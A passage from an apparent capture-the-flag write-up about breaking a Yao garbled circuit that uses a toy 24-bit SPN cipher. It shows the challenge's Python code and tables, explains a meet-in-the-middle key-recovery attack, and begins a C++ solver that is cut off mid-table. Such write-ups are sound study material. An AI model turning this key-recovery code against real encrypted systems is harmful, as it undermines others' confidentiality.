m<span style="color:#f92672">.</span>update(msg)
m<span style="color:#f92672">.</span>digest()

xor_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">),u</span><span style="color:#ae81ff">\x1b\x1d</span><span style="color:#e6db74">E:</span><span style="color:#ae81ff">\xa8</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">}&amp;</span><span style="color:#ae81ff">\xc7\x90\xbb\xce</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xf5\x17\x89\xd7\xfa\x07\x86\x83\xfa\x9b</span><span style="color:#e6db74">^</span><span style="color:#ae81ff">\xcb\xd7</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xca\xce</span><span style="color:#e6db74">XD7&#39;</span>


<span style="color:#66d9ef">print</span>( xor(m<span style="color:#f92672">.</span>digest(), xor_flag) )

<span style="color:#66d9ef">assert</span> xor(m<span style="color:#f92672">.</span>digest(), xor_flag) <span style="color:#f92672">==</span> flag
</code></pre></div><p>The <code>circuit</code> is as follow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;inputs&#34;</span> : [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>],
    <span style="color:#f92672">&#34;outputs&#34;</span>   : [<span style="color:#ae81ff">7</span>],
    <span style="color:#f92672">&#34;gates&#34;</span> : [
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>]},
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">6</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>]},
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">7</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>]}
    ]
}
</code></pre></div><p>The <code>g_tables</code> is as follow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">g_tables <span style="color:#f92672">=</span> {<span style="color:#ae81ff">5</span>: [(<span style="color:#ae81ff">5737111</span>, <span style="color:#ae81ff">2983937</span>),
  (<span style="color:#ae81ff">15406556</span>, <span style="color:#ae81ff">16284948</span>),
  (<span style="color:#ae81ff">14172222</span>, <span style="color:#ae81ff">14132908</span>),
  (<span style="color:#ae81ff">4000971</span>, <span style="color:#ae81ff">16383744</span>)],
 <span style="color:#ae81ff">6</span>: [(<span style="color:#ae81ff">8204186</span>, <span style="color:#ae81ff">1546264</span>),
  (<span style="color:#ae81ff">229766</span>, <span style="color:#ae81ff">3208405</span>),
  (<span style="color:#ae81ff">9550202</span>, <span style="color:#ae81ff">13483954</span>),
  (<span style="color:#ae81ff">13257058</span>, <span style="color:#ae81ff">5195482</span>)],
 <span style="color:#ae81ff">7</span>: [(<span style="color:#ae81ff">1658768</span>, <span style="color:#ae81ff">11512735</span>),
  (<span style="color:#ae81ff">1023507</span>, <span style="color:#ae81ff">9621913</span>),
  (<span style="color:#ae81ff">7805976</span>, <span style="color:#ae81ff">1206540</span>),
  (<span style="color:#ae81ff">2769364</span>, <span style="color:#ae81ff">9224729</span>)]}
</code></pre></div><p>The <code>evaluate_circuit</code> function is in <code>yao.py</code>, it uses the <code>circuit</code>, <code>g_tables</code> and <code>inputs</code> to update the <code>keys</code> and <code>evaluated</code> the <code>gates</code>, and the <code>evaluate_gate</code> function use <code>decrypt</code> function to get <code>lable</code> and <code>validation</code>, if <code>validation == 0</code> it will return the <code>label</code>, if no <code>label</code> return it will rasie an error.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># yao.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate_gate</span>(garbled_table, key0, key1):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Return the output label unlocked by the two input labels,
</span><span style="color:#e6db74">    or raise a ValueError if no entry correctly decoded
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> g <span style="color:#f92672">in</span> garbled_table:
        gl, v <span style="color:#f92672">=</span> g
        label <span style="color:#f92672">=</span> decrypt(gl, key0, key1)
        validation <span style="color:#f92672">=</span> decrypt(v, key0, key1)
        
        <span style="color:#66d9ef">if</span> validation <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">return</span> label
        
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;None of the gates correctly decoded; invalid input labels&#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate_circuit</span>(circuit, g_tables, inputs):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Evaluate yao circuit with given inputs.
</span><span style="color:#e6db74">    
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    circuit   -- dict containing circuit spec
</span><span style="color:#e6db74">    g_tables  -- garbled tables of yao circuit
</span><span style="color:#e6db74">    inputs  -- dict mapping wires to labels
</span><span style="color:#e6db74">    
</span><span style="color:#e6db74">    Returns:
</span><span style="color:#e6db74">    evaluation -- a dict mapping output wires to the result labels
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    gates        <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;gates&#34;</span>] <span style="color:#75715e"># dict containing circuit gates</span>
    wire_outputs <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;outputs&#34;</span>]   <span style="color:#75715e"># list of output wires</span>
    wire_inputs  <span style="color:#f92672">=</span> {}               <span style="color:#75715e"># dict containing Alice and Bob inputs</span>
    evaluation   <span style="color:#f92672">=</span> {}               <span style="color:#75715e"># dict containing result of evaluation</span>

    wire_inputs<span style="color:#f92672">.</span>update(inputs)
    
    <span style="color:#75715e"># Iterate over all gates</span>
    <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> sorted(gates, key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> g: g[<span style="color:#e6db74">&#34;id&#34;</span>]):
        gate_id, gate_in <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;id&#34;</span>], gate[<span style="color:#e6db74">&#34;in&#34;</span>]

        key0 <span style="color:#f92672">=</span> wire_inputs[gate_in[<span style="color:#ae81ff">0</span>]]
        key1 <span style="color:#f92672">=</span> wire_inputs[gate_in[<span style="color:#ae81ff">1</span>]]
        
        garbled_table <span style="color:#f92672">=</span> g_tables[gate_id]
        msg <span style="color:#f92672">=</span> evaluate_gate(garbled_table, key0, key1)
        
        wire_inputs[gate_id] <span style="color:#f92672">=</span> msg

    <span style="color:#75715e"># After all gates have been evaluated, we populate the dict of results</span>
    <span style="color:#66d9ef">for</span> out <span style="color:#f92672">in</span> wire_outputs:
        evaluation[out] <span style="color:#f92672">=</span> wire_inputs[out]

    <span style="color:#66d9ef">return</span> evaluation

</code></pre></div><p>The <code>decrypt</code> function is in <code>block_cipher.py</code>, it is an easy <code>SPN block cipher</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># block_cipher.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">S</span>(block, SBoxes):
    output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(SBoxes)):
        output <span style="color:#f92672">|=</span> SBoxes[i][(block <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i

    <span style="color:#66d9ef">return</span> output

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">permute</span>(block, pbox):
    output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">24</span>):
        bit <span style="color:#f92672">=</span> (block <span style="color:#f92672">&gt;&gt;</span> pbox[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>
        output <span style="color:#f92672">|=</span> (bit <span style="color:#f92672">&lt;&lt;</span> i)
    <span style="color:#66d9ef">return</span> output

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_data</span>(block, key):
    
    block <span style="color:#f92672">^=</span> key
    
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>):
        block <span style="color:#f92672">=</span> permute(block, PInvBox)
        block <span style="color:#f92672">=</span> S(block, SInvBoxes)
        block <span style="color:#f92672">^=</span> key

    <span style="color:#66d9ef">return</span> block

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(data, key1, key2):
    decrypted <span style="color:#f92672">=</span> decrypt_data(data, key2)
    decrypted <span style="color:#f92672">=</span> decrypt_data(decrypted, key1)
    <span style="color:#66d9ef">return</span> decrypted
</code></pre></div><p>So we can know the <code>inputs</code> is <code>24-bit</code>. But these infomations are not enough for us to solve this challenge.
Let take a look at <code>evaluate_garbled_circuit_example.py</code>, it gives us an example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74"># evaluate_garbled_circuit_example.py
</span><span style="color:#e6db74">This file is provided as an example of how to load the garbled circuit
</span><span style="color:#e6db74">and evaluate it with input key labels.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Note: the ACTUAL `g_tables` for this challenge are in `public_data.py`, and are not used in this example.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">It will error if the provided inputs are not valid label keys,
</span><span style="color:#e6db74">ie do not match either of the `keys` made by `generate_garbled_circuit.py`
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">import</span> json

<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> evaluate_circuit
<span style="color:#f92672">from</span> generate_garbled_circuit <span style="color:#f92672">import</span> g_tables, keys


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)
        

inputs <span style="color:#f92672">=</span> {}
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> circuit[<span style="color:#e6db74">&#34;inputs&#34;</span>]:
    v <span style="color:#f92672">=</span> keys[i][<span style="color:#ae81ff">1</span>]
    inputs[i] <span style="color:#f92672">=</span> v

evaluation <span style="color:#f92672">=</span> evaluate_circuit(circuit, g_tables, inputs)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span>)
<span style="color:#66d9ef">print</span>(evaluation)
</code></pre></div><p>The <code>generate_garbled_circuit.py</code> is as follows, it use <code>GarbledCircuit</code> and <code>circuit</code> to generate the <code>g_tables</code> and <code>keys</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># generate_garbled_circuit.py</span>
<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> GarbledCircuit
<span style="color:#f92672">import</span> json


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)

<span style="color:#75715e"># creates a new garbled circuit each time</span>
gc <span style="color:#f92672">=</span> GarbledCircuit(circuit)

g_tables <span style="color:#f92672">=</span> gc<span style="color:#f92672">.</span>get_garbled_tables()
keys <span style="color:#f92672">=</span> gc<span style="color:#f92672">.</span>get_keys()


<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;g_tables = {}&#34;</span><span style="color:#f92672">.</span>format(repr(g_tables)))
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">keys = {}&#34;</span><span style="color:#f92672">.</span>format(repr(keys)))
</code></pre></div><p>And let take a look at <code>GarbledCircuit</code> and <code>GarbledGate</code> in <code>yao.py</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># yao.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">garble_label</span>(key0, key1, key2):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    key0, key1 = two input labels
</span><span style="color:#e6db74">    key2 = output label
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    gl <span style="color:#f92672">=</span> encrypt(key2, key0, key1)
    validation <span style="color:#f92672">=</span> encrypt(<span style="color:#ae81ff">0</span>, key0, key1)
    <span style="color:#66d9ef">return</span> (gl, validation)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GarbledGate</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;A representation of a garbled gate.
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    gate  -- dict containing gate spec
</span><span style="color:#e6db74">    keys  -- dict mapping each wire to a pair of keys
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#66d9ef">def</span> __init__(self, gate, keys):
        self<span style="color:#f92672">.</span>keys                <span style="color:#f92672">=</span> keys          <span style="color:#75715e"># dict of yao circuit keys</span>
        self<span style="color:#f92672">.</span>input               <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;in&#34;</span>]    <span style="color:#75715e"># list of inputs&#39; ID</span>
        self<span style="color:#f92672">.</span>output              <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;id&#34;</span>]    <span style="color:#75715e"># ID of output</span>
        self<span style="color:#f92672">.</span>gate_type           <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;type&#34;</span>]  <span style="color:#75715e"># Gate type: OR, AND, ...</span>
        self<span style="color:#f92672">.</span>garbled_table       <span style="color:#f92672">=</span> {}            <span style="color:#75715e"># The garbled table of the gate</span>

        labels0 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>input[<span style="color:#ae81ff">0</span>]]
        labels1 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>input[<span style="color:#ae81ff">1</span>]]
        labels2 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>output]
        
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>gate_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;AND&#34;</span>:
            self<span style="color:#f92672">.</span>garbled_table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_gen_garbled_AND_gate(labels0, labels1, labels2)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">NotImplementedError</span>(<span style="color:#e6db74">&#34;Gate type `{}` is not implemented&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>gate_type))


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_garbled_AND_gate</span>(self, labels0, labels1, labels2):
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        labels0, labels1 = two input labels
</span><span style="color:#e6db74">        labels2 = output label
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        key0_0, key0_1 <span style="color:#f92672">=</span> labels0
        key1_0, key1_1 <span style="color:#f92672">=</span> labels1
        key2_0, key2_1 <span style="color:#f92672">=</span> labels2
        
        G <span style="color:#f92672">=</span> []
        G<span style="color:#f92672">.</span>append(garble_label(key0_0, key1_0, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_0, key1_1, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_1, key1_0, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_1, key1_1, key2_1))
        <span style="color:#75715e"># randomly shuffle the table so you don&#39;t know what the labels correspond to</span>
        shuffle(G)
        
        <span style="color:#66d9ef">return</span> G


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_garbled_table</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return the garbled table of the gate.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>garbled_table

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GarbledCircuit</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    A representation of a garbled circuit.
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    circuit -- dict containing circuit spec
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#66d9ef">def</span> __init__(self, circuit):
        self<span style="color:#f92672">.</span>circuit        <span style="color:#f92672">=</span> circuit
        self<span style="color:#f92672">.</span>gates          <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;gates&#34;</span>]  <span style="color:#75715e"># list of gates</span>
        self<span style="color:#f92672">.</span>wires          <span style="color:#f92672">=</span> set()             <span style="color:#75715e"># list of circuit wires</span>

        self<span style="color:#f92672">.</span>keys           <span style="color:#f92672">=</span> {}  <span style="color:#75715e"># dict of keys</span>
        self<span style="color:#f92672">.</span>garbled_tables <span style="color:#f92672">=</span> {}  <span style="color:#75715e"># dict of garbled tables</span>

        <span style="color:#75715e"># Retrieve all wire IDs from the circuit</span>
        <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>gates:
            self<span style="color:#f92672">.</span>wires<span style="color:#f92672">.</span>add(gate[<span style="color:#e6db74">&#34;id&#34;</span>])
            self<span style="color:#f92672">.</span>wires<span style="color:#f92672">.</span>update(set(gate[<span style="color:#e6db74">&#34;in&#34;</span>]))
        self<span style="color:#f92672">.</span>wires <span style="color:#f92672">=</span> list(self<span style="color:#f92672">.</span>wires)

        self<span style="color:#f92672">.</span>_gen_keys()
        self<span style="color:#f92672">.</span>_gen_garbled_tables()


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_keys</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Create pair of keys for each wire.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> wire <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>wires:
            self<span style="color:#f92672">.</span>keys[wire] <span style="color:#f92672">=</span> (
                    generate_random_label(),
                    generate_random_label()
                    )

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_garbled_tables</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Create the garbled table of each gate.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>gates:
            garbled_gate <span style="color:#f92672">=</span> GarbledGate(gate, self<span style="color:#f92672">.</span>keys)
            self<span style="color:#f92672">.</span>garbled_tables[gate[<span style="color:#e6db74">&#34;id&#34;</span>]] <span style="color:#f92672">=</span> garbled_gate<span style="color:#f92672">.</span>get_garbled_table()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_garbled_tables</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return dict mapping each gate to its garbled table.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>garbled_tables

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_keys</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return dict mapping each wire to its pair of keys.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>keys
</code></pre></div><p>So we know the relationship between the <code>keys</code> and <code>g_tables</code>:
Assume the <code>input labels(keys)</code> are <code>[[a0,a1],[b0,b1]]</code>, and the <code>output lable(key)</code> is <code>[c0,c1]</code>, the <code>g_tables</code> are <code>[[l0,v0],[l1,v1],[l2,v2],[l3,v3]]</code>, so we can get:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">enc <span style="color:#f92672">=</span> [
    encrypt[c0,a0,b0],encrypt[<span style="color:#ae81ff">0</span>,a0,b0],
    encrypt[c0,a0,b1],encrypt[<span style="color:#ae81ff">0</span>,a0,b1],
    encrypt[c0,a1,b0],encrypt[<span style="color:#ae81ff">0</span>,a1,b0],
    encrypt[c1,a1,b1],encrypt[<span style="color:#ae81ff">0</span>,a1,b1],
    ]
[[l0,v0],[l1,v1],[l2,v2],[l3,v3]] <span style="color:#f92672">=</span> random_suffle(enc)
</code></pre></div><p>And the <code>Garbled Circuit</code> combine these <code>output lable</code> as <code>input lables</code> to generate more <code>output lable</code> until end.</p>
<p>We have the early <code>inputs lables</code> and <code>g_tables</code>, so we can use <code>MITM</code> to attack the <code>Garbled Circuit</code> with <code>validation</code>. And brute the order before <code>random suffle</code>. So we can recover the <code>keys</code> and finally get the flag.</p>
<h4 id="exp-2">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// exp.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unordered_map&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;vector&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> {{<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>}, {<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>}, {<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">15</span>}, {<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>}};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SInvBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> {{<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>}, {<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>}, {<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>}, {<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>}, {<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span 